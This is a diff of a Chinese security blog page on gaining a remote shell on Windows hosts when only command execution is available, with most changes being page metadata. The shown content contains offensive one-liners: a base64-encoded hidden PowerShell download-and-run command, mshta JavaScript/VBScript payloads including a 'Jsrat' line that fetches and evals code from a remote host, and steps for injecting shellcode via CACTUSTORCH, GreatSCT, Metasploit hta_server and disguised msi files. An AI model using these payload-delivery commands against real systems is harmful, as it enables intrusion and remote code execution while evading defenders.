@@ -31,7 +31,7 @@
 <meta property="og:description" content="前言​        对Windows的系统，经常会出现可以执行命令，但无法上线或是拿shell的情况">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-01-13T00:49:37.000Z">
-<meta property="article:modified_time" content="2021-03-28T14:25:42.211Z">
+<meta property="article:modified_time" content="2021-04-14T23:26:09.779Z">
 <meta property="article:author" content="nicaishui">
 <meta property="article:tag" content="上线">
 <meta name="twitter:card" content="summary">
@@ -202,18 +202,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -297,7 +297,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-03-28 22:25:42" itemprop="dateModified" datetime="2021-03-28T22:25:42+08:00">2021-03-28</time>
+        <time title="修改时间：2021-04-15 07:26:09" itemprop="dateModified" datetime="2021-04-15T07:26:09+08:00">2021-04-15</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -322,14 +322,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>9.2k</span>
+      <span>10k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>8 分钟</span>
+      <span>9 分钟</span>
     </span>
 </div>
 
@@ -346,7 +346,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$fileContent &#x3D; &quot;(new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;test&#x2F;raw&#x2F;master&#x2F;putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;&quot;</span><br><span class="line">$bytes  &#x3D; [System.Text.Encoding]::Unicode.GetBytes($fileContent);</span><br><span class="line">$encoded &#x3D; [System.Convert]::ToBase64String($bytes); </span><br><span class="line">$encoded</span><br></pre></td></tr></table></figure>
 <p>执行</p>
 <p>powershell -WindowStyle Hidden -enc base64</p>
-<h3 id="mshta方式"><a href="#mshta方式" class="headerlink" title="mshta方式"></a>mshta方式</h3><h4 id="metaspolit模块"><a href="#metaspolit模块" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">mshta xxx</span><br><span class="line">执行mshta xxxxx</span><br></pre></td></tr></table></figure>
+<h3 id="mshta方式"><a href="#mshta方式" class="headerlink" title="mshta方式"></a>mshta方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">执行vb</span><br><span class="line">	&gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)</span><br><span class="line">	</span><br><span class="line">Js</span><br><span class="line">	&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125;</span><br><span class="line">	</span><br><span class="line">Jsrat</span><br><span class="line">	&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.2.101:9998&#x2F;connect&quot;,false);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="metaspolit模块"><a href="#metaspolit模块" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">mshta xxx</span><br><span class="line">执行mshta xxxxx</span><br></pre></td></tr></table></figure>
 <h4 id="配合CACTUSTORCH"><a href="#配合CACTUSTORCH" class="headerlink" title="配合CACTUSTORCH"></a>配合CACTUSTORCH</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载 https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;CACTUSTORCH</span><br><span class="line">生成raw格式的shellcode并base64</span><br><span class="line">	base64从文件快速编码命令：cat 1.bin |base64 -w 0</span><br><span class="line">修改CACTUSTORCH.hta文件中Dim code处的内容为base64后的shellcode</span><br><span class="line">执行mshta http:&#x2F;&#x2F;x.x.x.x&#x2F;CACTUSTORCH.hta</span><br></pre></td></tr></table></figure>
 <h4 id="配合GreatSCT"><a href="#配合GreatSCT" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use mshta&#x2F;shellcode_inject&#x2F;base64_migrate</span><br></pre></td></tr></table></figure>
 <h3 id="msiexec方式"><a href="#msiexec方式" class="headerlink" title="msiexec方式"></a>msiexec方式</h3><p>可以将msi后缀改为png</p>
@@ -458,13 +459,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">141k</span>
+    <span title="站点总字数">221k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:08</span>
+    <span title="站点阅读时长">3:21</span>
   </span>
 </div>
 <div class="busuanzi-count">
